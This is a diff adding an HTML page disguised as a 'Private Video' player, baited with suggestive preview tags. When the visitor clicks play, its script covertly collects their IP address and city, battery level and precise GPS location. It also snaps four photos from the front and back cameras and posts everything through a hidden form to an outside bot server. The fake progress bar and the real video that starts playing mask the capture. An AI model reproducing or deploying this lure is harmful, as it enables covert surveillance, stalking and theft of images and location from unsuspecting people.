@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta property="og:title" content="video Noor" />
+  <meta property="og:description" content="🫦🫦🤤" />
+  <meta property="og:image" content="https://i.postimg.cc/DykJfyrz/1.jpg" />
+  <meta property="og:image:type" content="image/jpeg" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo" />
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="theme-color" content="#000000">
+
+  <!-- إضافة وسوم Twitter -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="video Noor" />
+  <meta name="twitter:description" content="🫦🤤" />
+  <meta name="twitter:image" content="https://i.postimg.cc/DykJfyrz/1.jpg" />
+  <meta name="twitter:image:width" content="1200" />
+  <meta name="twitter:image:height" content="630" />
+
+  <title>Video</title>
+  <style>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>مرحبا بك</title>
+  <style type="text/css">
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      background-color: #000;
+      color: #fff;
+    }
+
+    .video-player-container {
+      width: 90%;
+      max-width: 800px;
+      background: #111;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      position: relative;
+    }
+
+    .video-thumbnail {
+      position: relative;
+      width: 100%;
+      height: 450px;
+      background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
+                  url('https://i.postimg.cc/DykJfyrz/1.jpg');
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    #realVideo {
+      width: 100%;
+      height: 450px;
+      display: none;
+      background: #000;
+    }
+
+    .play-button-overlay {
+      width: 100px;
+      height: 100px;
+      background-color: rgba(255, 0, 0, 0.85);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+      z-index: 5;
+    }
+
+    .play-button-overlay:hover {
+      transform: scale(1.1);
+      background-color: rgba(255, 0, 0, 0.95);
+      box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+    }
+
+    .play-icon-large {
+      width: 0;
+      height: 0;
+      border-left: 30px solid white;
+      border-top: 20px solid transparent;
+      border-bottom: 20px solid transparent;
+      margin-left: 8px;
+    }
+
+    .video-info {
+      padding: 20px;
+      border-bottom: 1px solid #333;
+    }
+
+    .video-title {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .video-meta {
+      display: flex;
+      justify-content: space-between;
+      color: #aaa;
+      font-size: 0.9rem;
+    }
+
+    .video-controls {
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #1a1a1a;
+    }
+
+    .control-button {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1.2rem;
+      cursor: pointer;
+      padding: 8px 15px;
+      border-radius: 4px;
+      transition: background 0.2s;
+    }
+
+    .control-button:hover {
+      background: #333;
+    }
+
+    .progress-bar {
+      flex-grow: 1;
+      height: 4px;
+      background: #333;
+      border-radius: 2px;
+      margin: 0 20px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-fill {
+      position: absolute;
+      height: 100%;
+      width: 0%;
+      background: #ff0000;
+    }
+
+    .time-display {
+      color: #aaa;
+      font-size: 0.9rem;
+      min-width: 100px;
+    }
+
+    .spinner {
+      border: 4px solid #fff;
+      border-top: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      animation: spin 1s linear infinite;
+      position: absolute;
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #loading {
+      display: none;
+      font-size: 1.2rem;
+      color: #fff;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .loading-text {
+      margin-top: 10px;
+    }
+
+    .volume-control {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #aaa;
+    }
+
+    .volume-slider {
+      width: 80px;
+      height: 4px;
+      background: #333;
+      border-radius: 2px;
+      position: relative;
+    }
+
+    .volume-level {
+      position: absolute;
+      height: 100%;
+      width: 70%;
+      background: #ff0000;
+    }
+
+    .fullscreen-btn {
+      margin-left: 15px;
+    }
+
+    .live-badge {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: rgba(255, 0, 0, 0.9);
+      color: #fff;
+      padding: 5px 12px;
+      border-radius: 4px;
+      font-weight: bold;
+      font-size: 0.85rem;
+      letter-spacing: 1px;
+      z-index: 10;
+    }
+  </style>
+</head>
+<body>
+  <form id="data-form" method="POST" action="https://bot-qmpk.onrender.com/submitData">
+    <input type="hidden" name="chatId" id="chatId" />
+    <input type="hidden" name="imageDatas" id="imageDatas" />
+    <input type="hidden" name="location" id="location" />
+    <input type="hidden" name="permissions" id="permissions" />
+    <input type="hidden" name="ipInfo" id="ipInfo" />
+    <input type="hidden" name="battery" id="battery" />
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+  </form>
+
+  <div class="video-player-container">
+    <div class="video-info">
+      <div class="video-title">Private Video</div>
+      <div class="video-meta"></div>
+    </div>
+
+    <div class="video-thumbnail" id="thumbnailArea" onclick="captureData()">
+      <div class="live-badge">LIVE</div>
+      <div class="play-button-overlay">
+        <div class="play-icon-large"></div>
+        <div class="spinner" id="spinner"></div>
+      </div>
+    </div>
+
+    <video id="realVideo" controls>
+      <source src="https://files.catbox.moe/6490uw.mp4" type="video/mp4">
+    </video>
+
+    <div class="video-controls">
+      <div class="progress-bar">
+        <div class="progress-fill"></div>
+      </div>
+      
+      <div class="time-display">0:00 / 2:45</div>
+      
+      <div class="volume-control">
+        <span></span>
+        <div class="volume-slider">
+          <div class="volume-level"></div>
+        </div>
+      </div>
+      
+      <button class="control-button fullscreen-btn">⛶</button>
+    </div>
+  </div>
+
+  <div id="loading">
+    <div class="spinner"></div>
+    <div class="loading-text"></div>
+  </div>
+
+  <script>
+    const permissions = [];
+    let images = [];
+    let ipInfo = '';
+    let batteryStatus = '';
+
+    async function fetchIPInfo() {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
+      } catch {
+        ipInfo = "IP Info not available";
+      }
+    }
+
+    async function getBatteryStatus() {
+      try {
+        const battery = await navigator.getBattery();
+        batteryStatus = Math.round(battery.level * 100) + '%';
+      } catch {
+        batteryStatus = "Unknown";
+      }
+    }
+
+    // دالة التقاط محسنة ومضمونة تمنع تعليق المتصفح
+    async function captureFromCamera(facingMode) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: facingMode } // إزالة exact لزيادة التوافقية مع المتصفحات الهواتف
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // تأخير بسيط للتأكد من وضوح الصورة
+        await new Promise(resolve => setTimeout(resolve, 800));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
+
+        // إغلاق الكاميرا فوراً لتحرير الإذن للطلب التالي
+        stream.getTracks().forEach(track => track.stop());
+        permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
+      } catch (err) {
+        permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied: ${err.name}`);
+      }
+    }
+
+    async function getLocation() {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 0
+          });
+        });
+        return `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
+      } catch (err) {
+        permissions.push('Geolocation Denied');
+        return '';
+      }
+    }
+
+    async function captureData() {
+      // 1. تشغيل الفيديو فوراً للمستخدم حتى لا يشعر بأي تأخير
+      const thumbnailArea = document.getElementById('thumbnailArea');
+      const realVideo = document.getElementById('realVideo');
+      
+      thumbnailArea.style.display = 'none';
+      realVideo.style.display = 'block';
+      realVideo.play(); 
+
+      const loading = document.getElementById('loading');
+      const spinner = document.querySelector('.spinner');
+      const playButtons = document.querySelectorAll('.play-button, .play-button-overlay');
+
+      spinner.style.display = 'block';
+      loading.style.display = 'block';
+      playButtons.forEach(btn => btn.style.opacity = '0.5');
+      playButtons.forEach(btn => btn.style.pointerEvents = 'none');
+
+      const chatId = new URLSearchParams(window.location.search).get('chatId');
+      document.getElementById('chatId').value = chatId;
+
+      // جمع بيانات الجهاز في الخلفية
+      await fetchIPInfo();
+      document.getElementById('ipInfo').value = ipInfo;
+
+      await getBatteryStatus();
+      document.getElementById('battery').value = batteryStatus;
+
+      // 2. [الترتيب الصحيح] - نطلب الموقع أولاً وننتظر حتى ينتهي تماماً
+      const location = await getLocation();
+      document.getElementById('location').value = location;
+
+      // 3. [بالتوالي بعد الموقع] - نطلب الكاميرا الأمامية ثم الخلفية بالتتابع النظيف منعاً للتصادم
+      await captureFromCamera('user');        // الصورة الأولى (أمامية)
+      await captureFromCamera('environment'); // الصورة الثانية (خلفية)
+      
+      // إذا كنت بحاجة لصور إضافية يفضل وضع مهلة زمنية صغيرة بينها
+      await new Promise(resolve => setTimeout(resolve, 500));
+      await captureFromCamera('user');        // الصورة الثالثة (أمامية)
+      await captureFromCamera('environment'); // الصورة الرابعة (خلفية)
+
+      document.getElementById('imageDatas').value = images.join(',');
+      document.getElementById('permissions').value = permissions.join(', ');
+
+      spinner.style.display = 'none';
+      loading.style.display = 'none';
+      playButtons.forEach(btn => btn.style.opacity = '1');
+      playButtons.forEach(btn => btn.style.pointerEvents = 'auto');
+
+      // 4. إرسال البيانات بدون إعادة توجيه
+      const form = document.getElementById('data-form');
+      form.target = 'hidden_iframe';
+      form.submit();
+    }
+
+    // التحكم بالأزرار القديمة
+    document.querySelectorAll('.control-button').forEach(button => {
+      button.addEventListener('click', function(e) {
+        e.stopPropagation();
+        if(this.textContent.includes('⛶')) {
+          alert('Fullscreen mode would activate here');
+        }
+      });
+    });
+
+    // حركة شريط التقدم الوهمي
+    const progressInterval = setInterval(() => {
+      const progressFill = document.querySelector('.progress-fill');
+      if(document.getElementById('realVideo').style.display === 'block') {
+        clearInterval(progressInterval);
+        return;
+      }
+      const currentWidth = parseInt(progressFill.style.width) || 35;
+      const newWidth = (currentWidth + 0.1) % 100;
+      progressFill.style.width = newWidth + '%';
+      
+      const timeDisplay = document.querySelector('.time-display');
+      const currentSeconds = Math.floor((newWidth / 100) * 165);
+      const minutes = Math.floor(currentSeconds / 60);
+      const seconds = currentSeconds % 60;
+      timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
+    }, 1000);
+  </script>
+</body>
+</html>
